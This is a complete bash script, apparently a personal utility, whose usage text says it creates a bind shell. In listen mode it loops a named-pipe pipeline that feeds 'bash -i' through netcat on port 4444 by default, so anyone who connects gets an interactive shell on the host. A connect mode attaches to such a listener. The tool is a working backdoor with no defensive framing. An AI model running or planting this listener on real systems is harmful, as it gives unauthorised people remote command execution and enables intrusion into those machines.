#!/usr/bin/env bash

### Helpers begin
check_deps() {
    local missing
    for d in "${deps[@]}"; do
        if [[ -z $(command -v "$d") ]]; then
            # Force absolute path
            if [[ ! -f "/$d" ]]; then
                err "$d was not found"
                missing="true"
            fi
        fi
    done; unset d
    [[ -z $missing ]] || exit 128
}
err() { echo -e "${color:+\e[31m}[!] $*\e[0m"; }
errx() { err "${*:2}"; exit "$1"; }
good() { echo -e "${color:+\e[32m}[+] $*\e[0m"; }
info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}
subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
### Helpers end

connect() {
    $nc $host $port
}

listen() {
    while :; do
        rm -f $fifo
        mkfifo $fifo
        cat $fifo | bash -i 2>&1 | $nc -lvp $port >$fifo
        sleep 1
    done
    rm -f $fifo
}

usage() {
    cat <<EOF
Usage: ${0##*/} [OPTIONS]

Create a bind shell

Options:
    -c, --connect      Connect to a listening bind_shell instance
    -f, --fifo=FIFO    Use the specified fifo
    -h, --help         Display this help message
    --host=HOST        Use the specified host
    -l, --listen       Listen for a connection from a connecting
                       bind_shell instance
    --nc=NC            Use the specified nc binary
    --no-color         Disable colorized output
    -p, --port=PORT    Use the specified port

EOF
    exit "$1"
}

declare -a args deps
unset help host
color="true"
deps+=("mkfifo")
fifo="/tmp/f"
if [[ -n $(command -v nc) ]]; then
    nc="$(command -v nc)"
elif [[ -n $(command -v ncat) ]]; then
    nc="$(command -v ncat)"
elif [[ -n $(command -v netcat) ]]; then
    nc="$(command -v netcat)"
fi
port="4444"

# Check for missing dependencies
check_deps

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-c"|"--connect") action="connect" ;;
        "-f"|"--fifo"*) fifo="$(long_opt "$@")" || shift ;;
        "-h"|"--help") help="true" ;;
        "--host"*) host="$(long_opt "$@")" || shift ;;
        "-l"|"--listen") action="listen" ;;
        "--nc"*) nc="$(long_opt "$@")" || shift ;;
        "--no-color") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"

# Check for valid params
[[ -z $help ]] || usage 0
[[ $# -eq 0 ]] || usage 1
[[ -n $action ]] || usage 2
[[ -n $nc ]] || usage 3
[[ -f $nc ]] || usage 4

case "$action" in
    "connect") [[ -n $host ]] || errx 5 "No host provided"; connect ;;
    "listen") listen ;;
esac
